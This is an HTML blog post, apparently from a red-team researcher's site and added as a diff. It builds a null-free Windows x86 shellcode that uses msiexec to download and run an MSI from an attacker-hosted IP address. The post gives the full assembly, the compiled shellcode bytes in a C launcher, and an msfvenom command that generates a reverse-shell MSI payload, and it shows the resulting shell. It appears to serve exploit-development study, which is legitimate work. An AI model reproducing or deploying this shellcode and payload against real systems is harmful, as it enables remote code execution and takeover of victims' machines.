@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC</title>
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC | IAMROOT</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC" />
+<meta name="author" content="Kartik Durg" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="msiexec /i http://192.168.1.3/ms.msi /qn" />
+<meta property="og:description" content="msiexec /i http://192.168.1.3/ms.msi /qn" />
+<link rel="canonical" href="http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html" />
+<meta property="og:url" content="http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html" />
+<meta property="og:site_name" content="IAMROOT" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-01-28T00:00:00+05:30" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html"},"author":{"@type":"Person","name":"Kartik Durg"},"description":"msiexec /i http://192.168.1.3/ms.msi /qn","headline":"WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC","dateModified":"2019-01-28T00:00:00+05:30","datePublished":"2019-01-28T00:00:00+05:30","@type":"BlogPosting","url":"http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<head>
+
+</head></head>
+
+<body>
+  <main class="container">
+    <section class="about">
+      <a href="/"><img src="/assets/portfolio.jpg" alt="Kartik Durg"></a>
+      <h2 id="title">
+        <a href="/">Kartik Durg</a>
+      </h2>
+      <p class="tagline">Red Team Research @McAfee</p>
+      <ul class="social"><a href="https://github.com/kartikdurg" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/kartikdurg" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/kartikdurg" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><nav class="navigation">
+        <ul>
+          
+          <li>
+            <a href="/index.html">Home</a>
+          </li>
+          
+        </ul>
+      </nav><p>&copy;
+        2020</p><div>
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" id="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+      <script type="text/javascript" src="/assets/js/darkmode.js"></script></section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html">
+    <h2 class="post-title">WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Jan 28, 2019</div></div>
+  <div class="post">
+    <p>Hello and welcome! Today I will be sharing a shellcode that came across my mind when I was preparing for my OSCE exam, so this inspired me to write and share my knowledge on how I developed a shellcode for windows to download and execute a remote payload using windows installer(msiexec.exe).</p>
+
+<p>The objective for this shellcode was to obtain code execution on my target machine from the following command line, also make sure that shellcode is small in size and NULL free:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /i http://server/package.msi /qn
+</code></pre></div></div>
+
+<p>Typically, windows installer is used to install software or a patch, but we can take advantage of this built in windows tool to download and execute remote payload in the background while avoiding detection.</p>
+
+<p>To achieve the above objective, I started searching for windows functions and came across a system API which takes only one parameter and that is our command line itself. We will first load msvcrt.dll library dynamically and then use system() to execute the above command line.</p>
+
+<p>Reference: <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2017">System()</a></p>
+
+<p>With all that information, we will collect the address of following functions using arwin:</p>
+
+<ul>
+  <li>LoadLibraryA and ExitProcess can be found in kernel32.dll, and system() can be found in msvcrt.dll. Here is the output from arwin on my WIN7 box:</li>
+</ul>
+
+<p><img src="/media/arwin.jpg" alt="" /></p>
+
+<p>Now that we have address of the required functions, our first step is to load msvcrt.dll dynamically with the help of  LoadLibraryA function and we do that by pushing the name of DLL (in this case msvcrt) and then calling the function LoadLibraryA as below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor eax, eax          ;Get the msvcrt.dll
+mov ax, 0x7472        ;"tr\0\0"
+push eax
+push dword 0x6376736d ;"cvsm"
+push esp
+
+; LoadLibrary
+mov ebx, 0x7717de85    ;Address of function LoadLibraryA (win7)
+call ebx
+mov ebp, eax           ;msvcrt.dll is saved in ebp
+</code></pre></div></div>
+
+<p>NOTE: The above snippet can be skipped if the binary/application you are trying to exploit is already loading the msvcrt.dll. (Will reduce the size of shellcode)</p>
+
+<p>After loading the msvcrt.dll, we have to convert the command line to hex and insert them in a inverted order with a NULL byte at the end of string. Once the command line to be executed is pushed, we will call the system() function for its execution.
+Here is how I did it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Command Line: msiexec /i http://192.168.1.3/ms.msi /qn
+
+"ms.msi" hosted on my attacking box with local IP "192.168.1.3".
+</code></pre></div></div>
+
+<p>The above command line was converted to hex and pushed on to the stack as below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor eax, eax      ;zero out EAX
+PUSH eax	  ;NULL at the end of string
+PUSH 0x6e712f20   ;"nq/ "
+PUSH 0x69736d2e   ;"ism."
+PUSH 0x736d2f33   ;"sm/3"
+PUSH 0x2e312e38   ;".1.8"
+PUSH 0x36312e32   ;"61.2"
+PUSH 0x39312f2f   ;"91//"
+PUSH 0x3a707474   ;":ptt"
+PUSH 0x6820692f   ;"h i/"
+PUSH 0x20636578   ;" cex"
+PUSH 0x6569736d   ;"eism"
+MOV EDI,ESP       ;adding a pointer to the stack
+PUSH EDI
+MOV EAX,0x7587b177 ;calling the system()(win7)
+CALL EAX
+</code></pre></div></div>
+
+<p>The last part is to make sure that our shellcode exit properly by adding the following instructions at the bottom:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor eax, eax
+push eax
+mov eax, 0x7718be52  ; ExitProcess
+call eax
+</code></pre></div></div>
+
+<h3 id="final-assembly-code">FINAL ASSEMBLY CODE:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor eax, eax             ;Get the msvcrt.dll
+mov ax, 0x7472           ;"tr\0\0"
+push eax
+push dword 0x6376736d    ;"cvsm"
+push esp
+
+; LoadLibrary
+mov ebx, 0x7717de85      ;Address of function LoadLibraryA (win7)
+call ebx
+mov ebp, eax             ;msvcrt.dll is saved in ebp
+
+xor eax, eax             ;zero out EAX
+PUSH eax                 ;NULL at the end of string
+PUSH 0x6e712f20          ;"nq/ "
+PUSH 0x69736d2e          ;"ism."
+PUSH 0x736d2f33          ;"sm/3"
+PUSH 0x2e312e38          ;".1.8"
+PUSH 0x36312e32          ;"61.2"
+PUSH 0x39312f2f          ;"91//"
+PUSH 0x3a707474          ;":ptt"
+PUSH 0x6820692f          ;"h i/"
+PUSH 0x20636578          ;" cex"
+PUSH 0x6569736d          ;"eism"
+MOV EDI,ESP              ;adding a pointer to the stack
+PUSH EDI
+MOV EAX,0x7587b177       ;calling the system()(win7)
+CALL EAX
+
+xor eax, eax
+push eax
+mov eax, 0x7718be52     ; ExitProcess
+call eax
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="the-final-shellcode">THE FINAL SHELLCODE:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==&gt; Compiling the assembly code
+nasm -f win32 C:\Users\JBOY\Desktop\deb.asm -o C:\Users\JBOY\Desktop\deb.o
+==&gt; Extracting the shellcode
+objdump -d deb.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+==&gt;Our final shellcode
+
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+char code[] = "\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x85\xde\x17\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x33\x2f\x6d\x73\x68\x38\x2e\x31\x2e\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x87\x75\xff\xd0\x31\xc0\x50\xb8\x52\xbe\x18\x77\xff\xd0";
+
+int main(int argc, char **argv)
+{
+int (*func)();
+func = (int (*)()) code;
+(int)(*func)();
+}
+</code></pre></div></div>
+
+<h3 id="compiling-and-executing-the-final-shellcode">COMPILING AND EXECUTING THE FINAL SHELLCODE:</h3>
+
+<p>“ms.msi” hosted on my attacking box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Reverse shell payload generated using metasploit(msfvenom):
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=443 EXITFUNC=seh -f msi &gt; /var/www/html/ms.msi
+</code></pre></div></div>
+
+<p><img src="/media/msfvenom-msi.jpg" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==&gt; Compiled the final shellcode after hosting "ms.msi":
+gcc C:\Users\JBOY\Desktop\deb.c -o C:\Users\JBOY\Desktop\deb.exe
+</code></pre></div></div>
+
+<p>Once the “deb.exe” is executed:</p>
+
+<p><img src="/media/rev-shell-deb-exe.jpg" alt="" /></p>
+
+<p>BINGO.. A reverse shell from my WIN7 box!!!!</p>
+
+<p>Objectives achieved:</p>
+
+<ul>
+  <li>Shellcode is null free.</li>
+  <li>Only 95 bytes in size.</li>
+  <li>Target IP and the address of windows API’s can be easily configured.</li>
+  <li>Register independent</li>
+  <li>Supports windows platforms from XP to latest. 🙂</li>
+</ul>
+
+<p>Link to shellcode.c: <a href="https://github.com/kartikdurg/Windowsx86-Shellcode/blob/master/MSIEXEC/download_execute_msiexec.c">download_execute_msiexec.c</a></p>
+
+<p>Link to shellcode.asm: <a href="https://github.com/kartikdurg/Windowsx86-Shellcode/blob/master/MSIEXEC/download_execute_msiexec.asm">download_execute_msiexec.asm</a></p>
+
+<p>Exploit-DB: <a href="https://www.exploit-db.com/shellcodes/46281">https://www.exploit-db.com/shellcodes/46281</a></p>
+
+<p>Thank you for reading 🙂</p>
+
+<p>– Kartik Durg</p>
+
+  </div><div id="disqus_thread" style="margin-top:25px"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = 'http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html';
+      this.page.identifier = 'http://localhost:4000/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec.html';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://redteam.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments
+      powered by Disqus.</a></noscript></div>
+
+    </section>
+  </main><script async src="https://www.googletagmanager.com/gtag/js?id=UA-176694116-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'UA-176694116-1');
+  </script>
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
